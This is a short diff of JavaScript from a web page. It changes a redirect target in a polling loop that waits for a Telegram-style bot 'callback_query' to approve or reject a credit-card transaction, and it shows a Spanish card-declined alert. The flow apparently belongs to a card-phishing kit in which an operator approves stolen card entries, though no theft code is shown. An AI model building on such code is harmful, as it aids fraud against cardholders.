@@ -463,7 +463,7 @@
                 alert("La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
               }
               if (verificationUpdate.callback_query.data === `finalizar:${transactionId}`) {
-                window.location.href = "finish.html";
+                window.location.href = "finish.php";
               }
             } else {
               setTimeout(() => checkPaymentVerification(transactionId, config), 2000);
